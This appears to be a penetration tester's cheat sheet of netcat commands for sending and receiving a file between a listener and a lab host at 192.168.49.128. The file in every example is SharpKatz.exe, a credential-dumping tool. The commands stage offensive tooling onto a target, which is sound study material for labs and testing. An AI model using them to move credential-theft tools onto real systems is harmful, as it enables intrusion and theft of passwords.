# FILE_TRANSFER
# LISTENING
DOWNLOAD
```
nc -l -p 8000 > SharpKatz.exe
```
UPLOAD
```
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```


# CONNECTING
UPLOAD
```
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

DOWNLOAD
```
nc 192.168.49.128 443 > SharpKatz.exe
```


# FLAGS
`-s 172.16.1.5` specify network adapter










